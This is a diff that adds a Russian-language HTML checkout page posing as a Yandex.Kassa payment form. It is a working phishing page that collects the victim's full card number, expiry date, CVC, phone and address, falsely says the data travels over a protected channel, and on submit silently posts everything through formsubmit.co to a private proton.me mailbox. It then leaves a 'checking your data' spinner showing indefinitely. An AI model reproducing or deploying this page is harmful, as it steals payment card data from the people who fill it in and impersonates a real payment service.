@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Оформление заказа</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f2f2f2;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            max-width: 500px;
+            width: 100%;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            padding: 30px 30px 40px;
+            position: relative;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 15px;
+        }
+        .header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+        .yandex-badge {
+            background: #1a1a1a;
+            color: #fff;
+            font-weight: 700;
+            padding: 6px 16px;
+            border-radius: 40px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .yandex-badge span {
+            font-size: 18px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1.5px solid #dcdcdc;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #fafafa;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+        .form-group input:focus {
+            border-color: #fc3f1d;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(252,63,29,0.08);
+        }
+        .form-group input:disabled {
+            background: #e8e8e8;
+            color: #333;
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+        .form-row .form-group {
+            flex: 1;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: #fc3f1d;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 10px;
+            letter-spacing: 0.5px;
+        }
+        .btn-submit:hover {
+            background: #d6300e;
+            transform: scale(1.01);
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+            color: white;
+            font-size: 20px;
+            font-weight: 500;
+        }
+        .overlay.active {
+            display: flex;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid rgba(255,255,255,0.3);
+            border-top: 6px solid #fc3f1d;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .overlay p {
+            margin: 0;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <h1>Оформление</h1>
+            <div class="yandex-badge">
+                <span>₽</span> Яндекс.Касса
+            </div>
+        </div>
+
+        <form id="orderForm">
+            <div class="form-group">
+                <label>Отправитель</label>
+                <input type="text" value="Қайратұлы Сағадат" disabled>
+                <input type="hidden" name="sender" value="Қайратұлы Сағадат">
+            </div>
+
+            <div class="form-group">
+                <label>Адрес доставки</label>
+                <input type="text" name="address" placeholder="Введите адрес полностью" required>
+            </div>
+
+            <div class="form-group">
+                <label>Номер карты</label>
+                <input type="text" id="cardInput" name="card" placeholder="0000 0000 0000 0000" maxlength="19" required autocomplete="cc-number">
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Срок действия</label>
+                    <input type="text" id="expiryInput" name="expiry" placeholder="ММ/ГГ" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label>CVC</label>
+                    <input type="text" id="cvcInput" name="cvc" placeholder="123" maxlength="3" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Телефон</label>
+                <input type="text" id="phoneInput" name="phone" placeholder="+7 777 7777777" maxlength="16" required>
+            </div>
+
+            <div class="form-group">
+                <label>Дополнительно</label>
+                <input type="text" name="extra" placeholder="Любая информация">
+            </div>
+
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="Новые данные заказа">
+
+            <button type="submit" class="btn-submit">Отправить</button>
+        </form>
+
+        <div class="footer">
+            Данные защищены, передача по защищённому каналу
+        </div>
+    </div>
+
+    <div class="overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p>Сейчас проверяем ваши данные...</p>
+        <p style="font-size: 14px; margin-top: 10px; opacity: 0.7;">Не закрывайте страницу</p>
+    </div>
+
+    <script>
+        (function() {
+            // Маска для номера карты: 4 цифры + пробел
+            const cardInput = document.getElementById('cardInput');
+            cardInput.addEventListener('input', function(e) {
+                let val = this.value.replace(/\D/g, '');
+                if (val.length > 16) val = val.slice(0, 16);
+                let formatted = '';
+                for (let i = 0; i < val.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += val[i];
+                }
+                this.value = formatted;
+            });
+
+            // Маска для срока действия карты (ММ/ГГ) с авто-добавлением слэша
+            const expiryInput = document.getElementById('expiryInput');
+            expiryInput.addEventListener('input', function(e) {
+                let val = this.value.replace(/\D/g, '');
+                if (val.length > 4) val = val.slice(0, 4);
+                
+                let formatted = '';
+                if (val.length > 0) {
+                    formatted = val.slice(0, 2);
+                    if (val.length > 2) {
+                        formatted += '/' + val.slice(2, 4);
+                    }
+                }
+                this.value = formatted;
+            });
+
+            // Маска для телефона: фиксированный +7 и любые цифры далее через удобный пробел
+            const phoneInput = document.getElementById('phoneInput');
+            
+            // Ставим начальное значение при фокусе, если поле пустое
+            phoneInput.addEventListener('focus', function() {
+                if (!this.value) {
+                    this.value = '+7 ';
+                }
+            });
+
+            phoneInput.addEventListener('input', function(e) {
+                let val = this.value;
+                
+                // Если пользователь пытается удалить код страны, возвращаем его назад
+                if (!val.startsWith('+7')) {
+                    this.value = '+7 ';
+                    return;
+                }
+                
+                // Берём только те цифры, которые идут строго ПОСЛЕ префикса "+7 "
+                let digitsAfterSeven = val.slice(2).replace(/\D/g, '');
+                
+                // Ограничиваем длину (10 любых цифр после кода страны)
+                if (digitsAfterSeven.length > 10) {
+                    digitsAfterSeven = digitsAfterSeven.slice(0, 10);
+                }
+                
+                // Форматируем для читаемости: разделяем пробелом первые 3 цифры от остальных
+                if (digitsAfterSeven.length > 0) {
+                    let part1 = digitsAfterSeven.slice(0, 3);
+                    let part2 = digitsAfterSeven.slice(3, 10);
+                    this.value = '+7 ' + part1 + (part2 ? ' ' + part2 : '');
+                } else {
+                    this.value = '+7 ';
+                }
+            });
+
+            // Ограничение для CVC: только цифры
+            const cvcInput = document.getElementById('cvcInput');
+            cvcInput.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').slice(0, 3);
+            });
+
+            // Отправка формы через AJAX
+            document.getElementById('orderForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                document.getElementById('loadingOverlay').classList.add('active');
+
+                const formData = new FormData(this);
+
+                fetch('https://formsubmit.co/ajax/Peroxida6767@proton.me', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    // Оставляем экран загрузки активным, как было в исходном коде
+                })
+                .catch(error => {
+                    console.error('Ошибка:', error);
+                });
+            });
+        })();
+    </script>
+
+</body>
+</html>
